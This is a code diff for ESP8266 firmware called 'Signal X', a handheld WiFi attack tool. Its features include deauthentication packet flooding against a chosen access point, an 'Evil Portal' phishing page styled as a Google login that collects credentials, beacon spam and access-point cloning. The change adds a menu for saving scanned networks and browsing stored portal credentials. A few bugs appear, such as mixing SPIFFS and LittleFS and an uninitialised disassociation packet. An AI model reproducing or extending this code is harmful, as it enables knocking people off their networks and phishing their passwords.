@@ -4,6 +4,7 @@
 #include <ESP8266WiFi.h>
 #include <ESP8266WebServer.h>
 #include <DNSServer.h>
+#include <LittleFS.h>
 
 SH1106Wire display(0x3c, 5, 4);
 
@@ -30,25 +31,34 @@ enum MenuState {
     BEACON_INFO,
     SSID_LIST,
     AP_CLONE_SCAN,
-    AP_CLONE_RUNNING
+    AP_CLONE_RUNNING,
+    FILES_MENU
 };
 
 MenuState currentState = MAIN_MENU;
-int currentMenuItem = 0;
+
+enum FileMenuState {
+    FILE_STORAGE,
+    FILE_NETWORKS,
+    FILE_CREDS,
+    FILE_VIEWING_NETWORKS,
+    FILE_VIEWING_CREDS
+};
 
 const char* menuItems[] = {
-    "WiFi Scan",     // 0
-    "Deauth",        // 1
-    "Evil Portal",   // 2
-    "Packet Mon",    // 3
-    "Beacon Spam",   // 4
-    "SSID List",     // 5
-    "AP Clone",      // 6
-    "WPS Attack",    // 7
-    "Settings"       // 8
-  };  
+  "WiFi Scan",     
+  "Deauth",        
+  "Evil Portal",   
+  "Packet Mon",    
+  "Beacon Spam",   
+  "SSID List",     
+  "AP Clone",      
+  "WPS Attack",   
+  "Files",         
+  "Settings"       
+};
 
-const int MENU_ITEMS = 9;
+const int MENU_ITEMS = 10;
 
 const char* funnySSIDs[] = {
     "FBI Surveillance Van",
@@ -72,6 +82,22 @@ unsigned long beaconPacketCount = 0;
 unsigned long beaconStartTime = 0;
 int currentBeaconChannel = 1;
 
+FileMenuState currentFileMenu = FILE_STORAGE;
+int currentFileIndex = 0;
+int totalFiles = 0;
+String currentFiles[50];
+
+void loadDirectoryFiles(const char* path) {
+    Dir dir = LittleFS.openDir(path);
+    currentFileIndex = 0;
+    totalFiles = 0;
+    
+    while (dir.next() && totalFiles < 50) {
+        currentFiles[totalFiles] = dir.fileName();
+        totalFiles++;
+    }
+}
+
 struct NetworkInfo {
     String ssid;
     int32_t rssi;
@@ -87,6 +113,7 @@ struct Credentials {
     String deviceInfo;
     String timestamp;
 };
+int currentMenuItem = 0;
 
 #define MAX_NETWORKS 50
 #define MAX_CREDS 10
@@ -160,16 +187,15 @@ const char* loginHTML = R"(
     wifi_promiscuous_enable(1);
 
     uint8_t packet[128] = {
-        0x80, 0x00,             // Frame Control
-        0x00, 0x00,             // Duration
-        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,   // Destination address
-        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,   // Random Source address
-        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,   // BSSID
-        0x00, 0x00,             // Sequence number
-        // Fixed parameters
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
-        0x64, 0x00,             // Beacon interval
-        0x31, 0x04,            // Capability info
+        0x80, 0x00,           
+        0x00, 0x00,           
+        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
+        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 
+        0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 
+        0x00, 0x00,  
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+        0x64, 0x00,           
+        0x31, 0x04,           
     };
 
     for(int i = 10; i < 16; i++) {
@@ -221,7 +247,7 @@ void handleBeaconAttack() {
       display.display();
   }
   
-  void ICACHE_RAM_ATTR onPacket(uint8_t *buf, uint16_t len) {
+  void IRAM_ATTR onPacket(uint8_t *buf, uint16_t len) {
       lastPacketCount++;
       packetHistory[historyIndex] = min(50, packetsPerSecond);
       historyIndex = (historyIndex + 1) % 128;
@@ -259,33 +285,124 @@ void drawDotIndicators() {
     }
 }
 
+
+void saveNetworksToFile() {
+  String filename = "/networks/scan_" + String(millis()) + ".txt";
+  File file = SPIFFS.open(filename, "w");
+  
+  for(int i = 0; i < networkCount; i++) {
+      String networkInfo = networks[i].ssid + "," + 
+                         String(networks[i].rssi) + "," +
+                         getEncryptionType(networks[i].encType) + "," +
+                         networks[i].mac + "," +
+                         String(networks[i].channel) + "\n";
+      file.print(networkInfo);
+  }
+  file.close();
+}
+
 void displaySavedNetworks() {
-    display.clear();
-    display.setFont(ArialMT_Plain_10);
-    display.setTextAlignment(TEXT_ALIGN_LEFT);
-    display.drawString(0, 0, "Saved Networks");
-    display.drawHorizontalLine(0, 12, 128);
-    
-    int startIdx = (currentNetwork / 4) * 4;
-    int itemsToShow = min(4, networkCount - startIdx);
-    
-    for(int i = 0; i < itemsToShow; i++) {
-        int actualIdx = startIdx + i;
-        String itemText = networks[actualIdx].ssid;
-        
-        if(itemText.length() > 16) {
-            itemText = itemText.substring(0, 14) + "..";
-        }
-        
-        if(actualIdx == currentNetwork) {
-            display.fillRect(0, 14 + (i * 12), 128, 11);
-            display.setColor(BLACK);
-        }
-        display.drawString(2, 14 + (i * 12), itemText);
-        display.setColor(WHITE);
-    }
-    
-    display.display();
+  display.clear();
+  display.setFont(ArialMT_Plain_10);
+  display.setTextAlignment(TEXT_ALIGN_LEFT);
+  display.drawString(0, 0, "Saved Networks");
+  display.drawHorizontalLine(0, 12, 128);
+  
+  int startIdx = (currentNetwork / 4) * 4;
+  int itemsToShow = min(4, networkCount + 1 - startIdx);
+  
+  for(int i = 0; i < itemsToShow; i++) {
+      int actualIdx = startIdx + i;
+      String itemText;
+      
+      if(actualIdx < networkCount) {
+          itemText = networks[actualIdx].ssid;
+          if(itemText.length() > 16) {
+              itemText = itemText.substring(0, 14) + "..";
+          }
+      } else {
+          itemText = "Save to File";
+      }
+      
+      if(actualIdx == currentNetwork) {
+          display.fillRect(0, 14 + (i * 12), 128, 11);
+          display.setColor(BLACK);
+      }
+      display.drawString(2, 14 + (i * 12), itemText);
+      display.setColor(WHITE);
+  }
+  
+  display.display();
+}
+
+void displayFileContents() {
+  display.clear();
+  display.setFont(ArialMT_Plain_10);
+
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  display.drawString(64, 0, "Signal X");
+  display.drawHorizontalLine(0, 12, 128);
+  
+  if (totalFiles == 0) {
+      display.drawString(64, 32, "No files found");
+  } else {
+      int startIdx = (currentFileIndex / 4) * 4;
+      int endIdx = min(startIdx + 4, totalFiles);
+      
+      for (int i = startIdx; i < endIdx; i++) {
+          String fileName = currentFiles[i];
+          if (fileName.length() > 18) {
+              fileName = fileName.substring(0, 15) + "...";
+          }
+          
+          if (i == currentFileIndex) {
+              display.fillRect(0, 14 + ((i-startIdx) * 12), 128, 11);
+              display.setColor(BLACK);
+          }
+          display.drawString(64, 14 + ((i-startIdx) * 12), fileName);
+          display.setColor(WHITE);
+      }
+  }
+  display.display();
+}
+
+void displayFilesMenu() {
+  display.clear();
+  display.setFont(ArialMT_Plain_10);
+
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  display.drawString(64, 0, "Signal X");
+  display.setTextAlignment(TEXT_ALIGN_RIGHT);
+  int batteryPercentage = map(analogRead(A0), 0, 1024, 0, 100);
+  String batteryText = String(batteryPercentage) + "%";
+  display.drawString(128, 0, batteryText);
+
+  display.setTextAlignment(TEXT_ALIGN_LEFT);
+  display.drawString(0, 15, "Storage Info:");
+  display.drawString(0, 27, "Used: 0KB");
+  display.drawString(0, 39, "Free: 500KB");
+  display.drawString(0, 51, "Total: 500KB");
+
+  display.drawVerticalLine(64, 12, 52);
+
+  if (currentFileMenu == FILE_NETWORKS) {
+      display.fillRect(70, 20, 54, 15);
+      display.setColor(BLACK);
+  }
+  display.drawRect(70, 20, 54, 15);
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
+  display.drawString(97, 23, "Networks");
+  display.setColor(WHITE);
+  
+  if (currentFileMenu == FILE_CREDS) {
+      display.fillRect(70, 40, 54, 15);
+      display.setColor(BLACK);
+  }
+  display.drawRect(70, 40, 54, 15);
+  display.drawString(97, 43, "Portal Creds");
+  display.setColor(WHITE);
+  
+  display.display();
 }
 
 void handleAPClone() {
@@ -469,25 +586,14 @@ void performWiFiScan() {
 }
 
 void performDeauth(const char* target_mac) {
-    uint8_t deauthPacket[26] = {
-        0xC0, 0x00,                 // Type/Subtype: Deauth
-        0x00, 0x00,                 // Duration
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination: Broadcast
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // Source: AP MAC
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // BSSID: AP MAC
-        0x00, 0x00,                 // Sequence
-        0x07, 0x00                  // Reason: Class 3 frame from nonassociated STA
-    };
-    
-    uint8_t disassocPacket[26] = {
-        0xA0, 0x00,                 // Type/Subtype: Disassoc
-        0x00, 0x00,                 // Duration
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,       // Destination: Broadcast
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // Source: AP MAC
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,       // BSSID: AP MAC
-        0x00, 0x00,                 // Sequence
-        0x07, 0x00                  // Reason: Class 3 frame from nonassociated STA
-    };
+  uint8_t deauthPacket[26] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00
+  };
+  uint8_t disassocPacket[26];
 
     sscanf(target_mac, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx",
         &deauthPacket[10], &deauthPacket[11], &deauthPacket[12],
@@ -680,251 +786,304 @@ void displayNetworkInfo() {
 }
 
 void setup() {
-      display.init();
-      display.flipScreenVertically();
-      display.setFont(ArialMT_Plain_16);
-      display.setTextAlignment(TEXT_ALIGN_CENTER);
-      
-      pinMode(BTN_UP, INPUT_PULLUP);
-      pinMode(BTN_DOWN, INPUT_PULLUP);
-      pinMode(BTN_SELECT, INPUT_PULLUP);
-      pinMode(A0, INPUT);
+  display.init();
+  display.flipScreenVertically();
+  display.setFont(ArialMT_Plain_16);
+  display.setTextAlignment(TEXT_ALIGN_CENTER);
   
-      WiFi.mode(WIFI_STA);
-      WiFi.disconnect();
+  pinMode(BTN_UP, INPUT_PULLUP);
+  pinMode(BTN_DOWN, INPUT_PULLUP);
+  pinMode(BTN_SELECT, INPUT_PULLUP);
+  pinMode(A0, INPUT);
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  LittleFS.begin();
+}
+
+void loop() {
+  static unsigned long lastDebounceTime = 0;
+  const unsigned long debounceDelay = 200;
+  static unsigned long lastAttackUpdate = 0;
+  
+  if ((millis() - lastDebounceTime) > debounceDelay) {
+      switch(currentState) {
+          case MAIN_MENU:
+              if (digitalRead(BTN_UP) == LOW && currentMenuItem > 0) {
+                  currentMenuItem--;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_DOWN) == LOW && currentMenuItem < MENU_ITEMS - 1) {
+                  currentMenuItem++;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  switch(currentMenuItem) {
+                      case 0:
+                          currentState = WIFI_SCANNING;
+                          performWiFiScan();
+                          currentState = WIFI_RESULTS;
+                          break;
+                      case 1:
+                          currentState = WIFI_SCANNING;
+                          performWiFiScan();
+                          currentState = DEAUTH_LIST;
+                          currentNetwork = 0;
+                          break;
+                      case 2:
+                          currentState = EVIL_PORTAL_MENU;
+                          currentPortalItem = 0;
+                          break;
+                      case 3:
+                          currentState = PACKET_MON;
+                          wifi_set_channel(currentChannel);
+                          wifi_promiscuous_enable(1);
+                          wifi_set_promiscuous_rx_cb(onPacket);
+                          break;
+                      case 4:
+                          currentState = BEACON_RUNNING;
+                          beaconStartTime = millis();
+                          beaconPacketCount = 0;
+                          wifi_set_opmode(STATION_MODE);
+                          wifi_promiscuous_enable(1);
+                          break;
+                      case 5:
+                          currentState = SSID_LIST;
+                          currentNetwork = 0;
+                          break;
+                      case 6:
+                          currentState = WIFI_SCANNING;
+                          performWiFiScan();
+                          currentState = AP_CLONE_RUNNING;
+                          beaconStartTime = millis();
+                          beaconPacketCount = 0;
+                          wifi_set_opmode(STATION_MODE);
+                          wifi_promiscuous_enable(1);
+                          break;
+                      case 8:
+                          currentState = FILES_MENU;
+                          break;
+                  }
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case FILES_MENU:
+              if (currentFileMenu == FILE_VIEWING_NETWORKS || currentFileMenu == FILE_VIEWING_CREDS) {
+                  if (digitalRead(BTN_UP) == LOW && currentFileIndex > 0) {
+                      currentFileIndex--;
+                      lastDebounceTime = millis();
+                  }
+                  if (digitalRead(BTN_DOWN) == LOW && currentFileIndex < totalFiles - 1) {
+                      currentFileIndex++;
+                      lastDebounceTime = millis();
+                  }
+                  if (digitalRead(BTN_SELECT) == LOW) {
+                      currentFileMenu = (currentFileMenu == FILE_VIEWING_NETWORKS) ? FILE_NETWORKS : FILE_CREDS;
+                      lastDebounceTime = millis();
+                  }
+              } else {
+                  if (digitalRead(BTN_UP) == LOW && currentFileMenu > FILE_NETWORKS) {
+                      currentFileMenu = FILE_NETWORKS;
+                      lastDebounceTime = millis();
+                  }
+                  if (digitalRead(BTN_DOWN) == LOW && currentFileMenu < FILE_CREDS) {
+                      currentFileMenu = FILE_CREDS;
+                      lastDebounceTime = millis();
+                  }
+                  if (digitalRead(BTN_SELECT) == LOW) {
+                      if (currentFileMenu == FILE_NETWORKS) {
+                          loadDirectoryFiles("/networks");
+                          currentFileMenu = FILE_VIEWING_NETWORKS;
+                      } else if (currentFileMenu == FILE_CREDS) {
+                          loadDirectoryFiles("/creds");
+                          currentFileMenu = FILE_VIEWING_CREDS;
+                      }
+                      lastDebounceTime = millis();
+                  }
+              }
+              break;
+
+          case WIFI_RESULTS:
+              if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
+                  currentNetwork--;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount - 1) {
+                  currentNetwork++;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  currentState = MAIN_MENU;
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case SSID_LIST:
+              if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
+                  currentNetwork--;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount) {
+                  currentNetwork++;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  if (currentNetwork == networkCount) {
+                      saveNetworksToFile();
+                      currentState = MAIN_MENU;
+                  }
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case DEAUTH_LIST:
+              if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
+                  currentNetwork--;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount) {
+                  currentNetwork++;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  handleDeauthAttack();
+                  currentState = DEAUTH_INFO;
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case DEAUTH_INFO:
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  currentState = MAIN_MENU;
+                  attackStartTime = 0;
+                  lastDebounceTime = millis();
+              }
+              if (millis() - lastAttackUpdate > 50) {
+                  handleDeauthAttack();
+                  lastAttackUpdate = millis();
+              }
+              break;
+
+          case EVIL_PORTAL_MENU:
+              if (digitalRead(BTN_UP) == LOW && currentPortalItem > 0) {
+                  currentPortalItem--;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_DOWN) == LOW && currentPortalItem < PORTAL_ITEMS - 1) {
+                  currentPortalItem++;
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  if (currentPortalItem == 0) {
+                      currentState = EVIL_PORTAL_RUNNING;
+                      startGooglePortal();
+                  }
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case EVIL_PORTAL_RUNNING:
+              dnsServer.processNextRequest();
+              webServer.handleClient();
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  currentState = EVIL_PORTAL_CREDS;
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case EVIL_PORTAL_CREDS:
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  currentState = EVIL_PORTAL_MENU;
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case PACKET_MON:
+              if (digitalRead(BTN_UP) == LOW && currentChannel < 14) {
+                  currentChannel++;
+                  wifi_set_channel(currentChannel);
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_DOWN) == LOW && currentChannel > 1) {
+                  currentChannel--;
+                  wifi_set_channel(currentChannel);
+                  lastDebounceTime = millis();
+              }
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  currentState = MAIN_MENU;
+                  wifi_promiscuous_enable(0);
+                  lastDebounceTime = millis();
+              }
+              if (millis() - lastSecond >= 1000) {
+                  packetsPerSecond = lastPacketCount;
+                  lastPacketCount = 0;
+                  lastSecond = millis();
+              }
+              break;
+
+          case BEACON_RUNNING:
+              handleBeaconAttack();
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  currentState = MAIN_MENU;
+                  wifi_promiscuous_enable(0);
+                  wifi_set_opmode(STATION_MODE);
+                  lastDebounceTime = millis();
+              }
+              break;
+
+          case AP_CLONE_RUNNING:
+              handleAPClone();
+              if (digitalRead(BTN_SELECT) == LOW) {
+                  currentState = MAIN_MENU;
+                  wifi_promiscuous_enable(0);
+                  wifi_set_opmode(STATION_MODE);
+                  lastDebounceTime = millis();
+              }
+              break;
+      }
   }
-  
-  void loop() {
-    static unsigned long lastDebounceTime = 0;
-    const unsigned long debounceDelay = 200;
-    static unsigned long lastAttackUpdate = 0;
-    static unsigned long lastDisplayUpdate = 0;
-    
-    if ((millis() - lastDebounceTime) > debounceDelay) {
-        if (currentState == MAIN_MENU) {
-            if (digitalRead(BTN_UP) == LOW) {
-                if (currentMenuItem > 0) {
-                    currentMenuItem--;
-                    lastDebounceTime = millis();
-                }
-            }
-            if (digitalRead(BTN_DOWN) == LOW) {
-                if (currentMenuItem < MENU_ITEMS - 1) {
-                    currentMenuItem++;
-                    lastDebounceTime = millis();
-                }
-            }
-            if (digitalRead(BTN_SELECT) == LOW) {
-                if (currentMenuItem == 0) {
-                    currentState = WIFI_SCANNING;
-                    performWiFiScan();
-                    currentState = WIFI_RESULTS;
-                } 
-                else if (currentMenuItem == 1) {
-                    currentState = WIFI_SCANNING;
-                    performWiFiScan();
-                    currentState = DEAUTH_LIST;
-                    currentNetwork = 0;
-                }
-                else if (currentMenuItem == 2) {
-                    currentState = EVIL_PORTAL_MENU;
-                    currentPortalItem = 0;
-                }
-                else if (currentMenuItem == 3) {
-                    currentState = PACKET_MON;
-                    wifi_set_channel(currentChannel);
-                    wifi_promiscuous_enable(1);
-                    wifi_set_promiscuous_rx_cb(onPacket);
-                }
-                else if (currentMenuItem == 4) {
-                    currentState = BEACON_RUNNING;
-                    beaconStartTime = millis();
-                    beaconPacketCount = 0;
-                    wifi_set_opmode(STATION_MODE);
-                    wifi_promiscuous_enable(1);
-                }
-                else if (currentMenuItem == 5) {
-                    currentState = SSID_LIST;
-                    currentNetwork = 0;
-                }
-                else if (currentMenuItem == 6) {
-                    currentState = WIFI_SCANNING;
-                    performWiFiScan();
-                    currentState = AP_CLONE_RUNNING;
-                    beaconStartTime = millis();
-                    beaconPacketCount = 0;
-                    wifi_set_opmode(STATION_MODE);
-                    wifi_promiscuous_enable(1);
-                }
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == WIFI_RESULTS) {
-            if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
-                currentNetwork--;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount - 1) {
-                currentNetwork++;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = MAIN_MENU;
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == DEAUTH_LIST) {
-            if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
-                currentNetwork--;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount) {
-                currentNetwork++;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_SELECT) == LOW) {
-                handleDeauthAttack();
-                currentState = DEAUTH_INFO;
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == DEAUTH_INFO) {
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = MAIN_MENU;
-                attackStartTime = 0;
-                lastDebounceTime = millis();
-            }
-            if (millis() - lastAttackUpdate > 50) {
-                handleDeauthAttack();
-                lastAttackUpdate = millis();
-            }
-        }
-        else if (currentState == EVIL_PORTAL_MENU) {
-            if (digitalRead(BTN_UP) == LOW && currentPortalItem > 0) {
-                currentPortalItem--;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_DOWN) == LOW && currentPortalItem < PORTAL_ITEMS - 1) {
-                currentPortalItem++;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_SELECT) == LOW) {
-                if (currentPortalItem == 0) {
-                    currentState = EVIL_PORTAL_RUNNING;
-                    startGooglePortal();
-                }
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == EVIL_PORTAL_RUNNING) {
-            dnsServer.processNextRequest();
-            webServer.handleClient();
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = EVIL_PORTAL_CREDS;
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == EVIL_PORTAL_CREDS) {
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = EVIL_PORTAL_MENU;
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == PACKET_MON) {
-            if (digitalRead(BTN_UP) == LOW && currentChannel < 14) {
-                currentChannel++;
-                wifi_set_channel(currentChannel);
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_DOWN) == LOW && currentChannel > 1) {
-                currentChannel--;
-                wifi_set_channel(currentChannel);
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = MAIN_MENU;
-                wifi_promiscuous_enable(0);
-                lastDebounceTime = millis();
-            }
-            
-            if(millis() - lastSecond >= 1000) {
-                packetsPerSecond = lastPacketCount;
-                lastPacketCount = 0;
-                lastSecond = millis();
-            }
-        }
-        else if (currentState == BEACON_RUNNING) {
-            static unsigned long lastChannelSwitch = 0;
-            if(millis() - lastChannelSwitch > 100) {
-                currentBeaconChannel = (currentBeaconChannel % 13) + 1;
-                wifi_set_channel(currentBeaconChannel);
-                lastChannelSwitch = millis();
-            }
 
-            for(int i = 0; i < NUM_FUNNY_SSIDS; i++) {
-                sendBeaconPacket(funnySSIDs[i]);
-            }
-            beaconPacketCount += NUM_FUNNY_SSIDS;
-            
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = MAIN_MENU;
-                wifi_promiscuous_enable(0);
-                wifi_set_opmode(STATION_MODE);
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == SSID_LIST) {
-            displaySavedNetworks();
-            if (digitalRead(BTN_UP) == LOW && currentNetwork > 0) {
-                currentNetwork--;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_DOWN) == LOW && currentNetwork < networkCount - 1) {
-                currentNetwork++;
-                lastDebounceTime = millis();
-            }
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = MAIN_MENU;
-                lastDebounceTime = millis();
-            }
-        }
-        else if (currentState == AP_CLONE_RUNNING) {
-            handleAPClone();
-            displayBeaconInfo();
-            if (digitalRead(BTN_SELECT) == LOW) {
-                currentState = MAIN_MENU;
-                wifi_promiscuous_enable(0);
-                wifi_set_opmode(STATION_MODE);
-                lastDebounceTime = millis();
-            }
-        }
-    }
-
-    if (currentState == MAIN_MENU) {
-        drawMenu();
-    }
-    else if (currentState == WIFI_RESULTS) {
-        displayNetworkInfo();
-    }
-    else if (currentState == DEAUTH_LIST) {
-        displayDeauthList();
-    }
-    else if (currentState == DEAUTH_INFO) {
-        displayDeauthInfo();
-    }
-    else if (currentState == EVIL_PORTAL_MENU) {
-        displayPortalMenu();
-    }
-    else if (currentState == EVIL_PORTAL_RUNNING) {
-        displayPortalRunning();
-    }
-    else if (currentState == EVIL_PORTAL_CREDS) {
-        displayCredentials();
-    }
-    else if (currentState == PACKET_MON) {
-        displayPacketMonitor();
-    }
-    else if (currentState == BEACON_RUNNING) {
-        displayBeaconInfo();
-    }
+  switch(currentState) {
+      case MAIN_MENU:
+          drawMenu();
+          break;
+      case FILES_MENU:
+          if (currentFileMenu == FILE_VIEWING_NETWORKS || currentFileMenu == FILE_VIEWING_CREDS) {
+              displayFileContents();
+          } else {
+              displayFilesMenu();
+          }
+          break;
+      case WIFI_RESULTS:
+          displayNetworkInfo();
+          break;
+      case DEAUTH_LIST:
+          displayDeauthList();
+          break;
+      case DEAUTH_INFO:
+          displayDeauthInfo();
+          break;
+      case EVIL_PORTAL_MENU:
+          displayPortalMenu();
+          break;
+      case EVIL_PORTAL_RUNNING:
+          displayPortalRunning();
+          break;
+      case EVIL_PORTAL_CREDS:
+          displayCredentials();
+          break;
+      case PACKET_MON:
+          displayPacketMonitor();
+          break;
+      case BEACON_RUNNING:
+          displayBeaconInfo();
+          break;
+      case SSID_LIST:
+          displaySavedNetworks();
+          break;
+      case AP_CLONE_RUNNING:
+          displayBeaconInfo();
+          break;
+  }
 }
